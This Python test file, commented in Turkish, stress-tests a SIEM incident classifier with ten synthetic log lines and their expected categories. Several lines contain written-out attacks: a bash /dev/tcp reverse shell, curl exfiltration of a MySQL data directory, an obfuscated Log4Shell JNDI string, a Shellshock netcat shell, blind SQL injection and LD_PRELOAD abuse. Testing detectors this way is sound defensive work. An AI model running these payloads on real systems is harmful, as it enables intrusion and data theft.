# File: test_incident_model.py
# Description: Extreme Stress Test Suite for SIEM Incident Classifier Engine
# Features: Multi-Layer Obfuscation, Zero-Day Injection, Noise Flooding & Edge-Case Vulnerability Testing

import os
import time
import torch
from typing import Dict, List, Any

from config.incident_config import config
from src.incident_classifier import SIEMIncidentClassifier
from src.deep_classifier import GPUDeepSIEMClassifier


def load_best_available_model():
    """Kayıtlı GPU veya CPU modelini yükler."""
    gpu_model_path = os.path.join(config.paths.MODELS_DIR, "gpu_deep_incident_model.pt")
    cpu_model_path = config.paths.MODEL_FILE

    if torch.cuda.is_available() and os.path.exists(gpu_model_path):
        print(f"📦 [EXTREME TEST ENGINE] PyTorch GPU Modeli Yükleniyor: {gpu_model_path}")
        return GPUDeepSIEMClassifier.load(gpu_model_path), "GPU"
    elif os.path.exists(cpu_model_path):
        print(f"📦 [EXTREME TEST ENGINE] Random Forest CPU Modeli Yükleniyor: {cpu_model_path}")
        return SIEMIncidentClassifier.load(cpu_model_path), "CPU"
    else:
        raise FileNotFoundError("❌ Model dosyası bulunamadı! Önce 'python train_incident_model.py' çalıştırın.")


def run_extreme_stress_tests():
    """
    Modeli sınırlarına kadar zorlayacak 10 gelişmiş saldırı ve sızma senaryosu.
    """
    model, hardware_mode = load_best_available_model()

    extreme_scenarios = [
        # -----------------------------------------------------------------------------------------
        # 1. TRIPLE-NESTED OBFUSCATION (Base64 + Hex + Rev)
        # -----------------------------------------------------------------------------------------
        {
            "id": "EX-01",
            "name": "Çok Katmanlı Karmaşık Obfuskasyon (Base64 + Hex + String Concatenation)",
            "raw_log": "Aug 13 16:00:01 srv-app-prod01 bash[1022]: Executed: /b'i'n/b'a's'h -c '$(echo -e \"\\x62\\x61\\x73\\x68\\x20\\x2d\\x69\") >& /dev/tcp/194.26.29.112/4444 0>&1'",
            "expected": "OBFUSCATION_EVASION",
            "challenge": "Tek tırnak parçalama, Hex şifreleme ve bash variable expansion aynı satırda."
        },
        # -----------------------------------------------------------------------------------------
        # 2. CHAMELEON STEALTH SQLi (Meşru Parametrelerin Arasına Gizlenmiş Time-Based Blind SQLi)
        # -----------------------------------------------------------------------------------------
        {
            "id": "EX-02",
            "name": "Chameleon Time-Based Blind SQL Injection (Karmaşık HTTP Log)",
            "raw_log": "Aug 13 16:01:12 srv-web-prod01 nginx[2200]: 10.240.0.45 - - [13/Aug/2026:16:01:12 +0300] \"GET /products/view?category=electronics&sort=price_asc&ref_id=88412'%20AND%20(SELECT%206821%20FROM%20(SELECT(SLEEP(5)))bAKq)--%20&utm_source=google HTTP/1.1\" 200 1420 \"https://example.com/shop\" \"Mozilla/5.0\"",
            "expected": "APPLICATION_EXPLOIT",
            "challenge": "Meşru URL parametreleri ve yönlendirme adresleri arasına gömülmüş SQLi."
        },
        # -----------------------------------------------------------------------------------------
        # 3. POLYMORPHIC FILELESS RAM INJECTION (Gelişmiş Memory Injection Variant)
        # -----------------------------------------------------------------------------------------
        {
            "id": "EX-03",
            "name": "Polimorfik Çekirdek & Proc-Self-Mem Manipülasyonu (Fileless)",
            "raw_log": "Aug 13 16:02:44 srv-k8s-node03 auditd[910]: type=SYSCALL audit(1691848990.111:105): arch=c000003e syscall=319 success=yes exit=4 items=0 exe=\"/proc/self/fd/7 (deleted)\" key=\"proc_mem_write\"",
            "expected": "PROCESS_INJECTION",
            "challenge": "Standart memfd_exec yerine /proc/self/fd/7 deleted üzerinden bellek yazma."
        },
        # -----------------------------------------------------------------------------------------
        # 4. ENVIRONMENT VARIABLE PRIVILEGE ESCALATION (Sudo LD_PRELOAD Abuse)
        # -----------------------------------------------------------------------------------------
        {
            "id": "EX-04",
            "name": "Sudo LD_PRELOAD Ortam Değişkeni Yetki Yükseltme",
            "raw_log": "Aug 13 16:04:02 srv-auth-vdi sudo: www-data : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=env LD_PRELOAD=/tmp/evil_hook.so /usr/bin/find .",
            "expected": "SYSTEM_INTEGRITY",
            "challenge": "Görünürde meşru find komutu ancak LD_PRELOAD yetki ihlali bayrağı içeriyor."
        },
        # -----------------------------------------------------------------------------------------
        # 5. NOISE-FLOODED C2 EXFILTRATION (Gürültüyle Boğulmuş Veri Sızdırma)
        # -----------------------------------------------------------------------------------------
        {
            "id": "EX-05",
            "name": "Gürültüyle Boğulmuş DNS/HTTP Exfiltration",
            "raw_log": "Aug 13 16:05:30 srv-db-node02 bash[31002]: Executed: /usr/bin/curl -s -X POST -d \"data=$(tar -czf - /var/lib/mysql/data | base64 -w 0 | head -c 200)&session_token=a8f9c2d1e4b3\" http://185.220.101.5/analytics/collect",
            "expected": "NETWORK_C2",
            "challenge": "Meşru 'analytics/collect' uç noktasına taklit edilmiş Veri Sızdırma (Exfiltration)."
        },
        # -----------------------------------------------------------------------------------------
        # 6. LOG4SHELL / SPRING4SHELL HYBRID OBFUSCATION
        # -----------------------------------------------------------------------------------------
        {
            "id": "EX-06",
            "name": "Obfuskasyonlu JNDI / Log4Shell Varyasyonu",
            "raw_log": "Aug 13 16:07:18 srv-api-gateway apache2[4102]: 194.26.29.112 - - [13/Aug/2026:16:07:18 +0300] \"GET /api/v2/orders HTTP/1.1\" 400 512 \"-\" \"${${lower:j}${upper:n}${lower:d}${lower:i}:${lower:r}${lower:m}${lower:i}://194.26.29.112:1099/Exploit}\"",
            "expected": "APPLICATION_EXPLOIT",
            "challenge": "Karakter dönüştürme operatörleri (${lower:j}) ile gizlenmiş JNDI payload'ı."
        },
        # -----------------------------------------------------------------------------------------
        # 7. ZERO-DAY KERNEL BPF HOOKING (eBPF Rootkit Tespiti)
        # -----------------------------------------------------------------------------------------
        {
            "id": "EX-07",
            "name": "Gelişmiş eBPF Çekirdek Dinleme & Gizlenme (Rootkit)",
            "raw_log": "Aug 13 16:08:50 srv-sec-vault auditd[1040]: type=BPF audit(1691849100.888:301): bpf_prog_load prog_type=BPF_PROG_TYPE_KPROBE insn_cnt=1420 exe=\"/tmp/.bpf_loader\" key=\"ebpf_stealth\"",
            "expected": "PROCESS_INJECTION",
            "challenge": "Modern Linux çekirdeklerinde eBPF kancası atan gelişmiş rootkit tespiti."
        },
        # -----------------------------------------------------------------------------------------
        # 8. FALSE-POSITIVE TRAP 1: HIGHLY COMPLEX LEGITIMATE DEV-COMMAND (Yanlış Alarm Tuzağı 1)
        # -----------------------------------------------------------------------------------------
        {
            "id": "EX-08",
            "name": "Karmaşık Meşru DevOps/Docker Komutu (False Positive Tuzağı)",
            "raw_log": "Aug 13 16:10:05 srv-k8s-worker3 bash[22104]: Executed: docker run --rm -v /var/run/docker.sock:/var/run/docker.sock -v $(pwd):/app -w /app node:18-alpine npm run build -- --config=prod.json",
            "expected": "SAFE_NOISE",
            "challenge": "İçinde soket, sh, eval benzeri ifadeler geçen ama %100 meşru DevOps komutu."
        },
        # -----------------------------------------------------------------------------------------
        # 9. FALSE-POSITIVE TRAP 2: LEGITIMATE CURL/WGET SCRIPT INSTALLER
        # -----------------------------------------------------------------------------------------
        {
            "id": "EX-09",
            "name": "Meşru Bifold Kurulum Komutu (False Positive Tuzağı)",
            "raw_log": "Aug 13 16:11:40 srv-app-prod01 bash[18902]: Executed: /usr/bin/curl -sSL https://get.docker.com | sh",
            "expected": "SAFE_NOISE",
            "challenge": "Saldırganların sıkça kullandığı 'curl | sh' kalıbının get.docker.com üzerindeki meşru kullanımı."
        },
        # -----------------------------------------------------------------------------------------
        # 10. ZERO-DAY BASH ENVIRONMENT INJECTION (Shellshock Style)
        # -----------------------------------------------------------------------------------------
        {
            "id": "EX-10",
            "name": "Shellshock Tarzı Ortam Değişkeni Enjeksiyonu (CVE-2014-6271 Variant)",
            "raw_log": "Aug 13 16:13:00 srv-web-prod01 nginx[2200]: 194.26.29.112 - - [13/Aug/2026:16:13:00 +0300] \"GET /cgi-bin/stats.cgi HTTP/1.1\" 200 120 \"-\" \"() { :;}; /bin/bash -c 'nc -e /bin/sh 194.26.29.112 4444'\"",
            "expected": "APPLICATION_EXPLOIT",
            "challenge": "User-Agent içine gömülmüş Shellshock tırnak ve fonksiyon tanımı enjeksiyonu."
        }
    ]

    print("\n" + "=" * 110)
    print(f"🔥 SIEM INCIDENT TAXONOMY - EXTREME STRESS TEST SUITE [{hardware_mode} ENGINE]")
    print("=" * 110 + "\n")

    correct_count = 0
    start_time = time.time()

    for scenario in extreme_scenarios:
        s_id = scenario["id"]
        s_name = scenario["name"]
        raw_log = scenario["raw_log"]
        expected = scenario["expected"]
        challenge = scenario["challenge"]

        res = model.predict_single(raw_log)
        pred_cat = res["predicted_category"]
        confidence = res["confidence"]
        
        is_success = (pred_cat == expected)
        if is_success:
            correct_count += 1
            status_str = "✅ PASS"
        else:
            status_str = "❌ FAIL"

        print(f"[{s_id}] {status_str} | {s_name}")
        print(f"     📄 ZORLU LOG   : {raw_log[:95]}...")
        print(f"     🎯 BEKLENEN    : {expected}")
        print(f"     🔍 TAHMİN      : {pred_cat} (%{confidence:.2f} Güven)")
        print(f"     ⚠️  ZORLUK      : {challenge}")
        
        if not is_success:
            print(f"     🚨 BAŞARISIZLIK: Model bu obfuskasyon/karmaşıklığı kaçırdı veya yanlış kategorize etti!")
        print("-" * 110)

    total_time = time.time() - start_time
    acc = (correct_count / len(extreme_scenarios)) * 100.0

    print("\n" + "=" * 110)
    print("📊 EXTREME STRESS-TEST SONUÇ RAPORU")
    print("=" * 110)
    print(f"🎯 Toplam Zorlu Senaryo Sayısı : {len(extreme_scenarios)}")
    print(f"🏆 Başarıyla Geçilen Senaryo   : {correct_count} / {len(extreme_scenarios)}")
    print(f"📈 Stress-Test Başarı Oranı    : %{acc:.2f}")
    print(f"⚡ Toplam Çıkarım Süresi       : {total_time:.4f} saniye (Log Başı: {(total_time/len(extreme_scenarios))*1000:.2f} ms)")
    print("=" * 110 + "\n")


if __name__ == "__main__":
    run_extreme_stress_tests()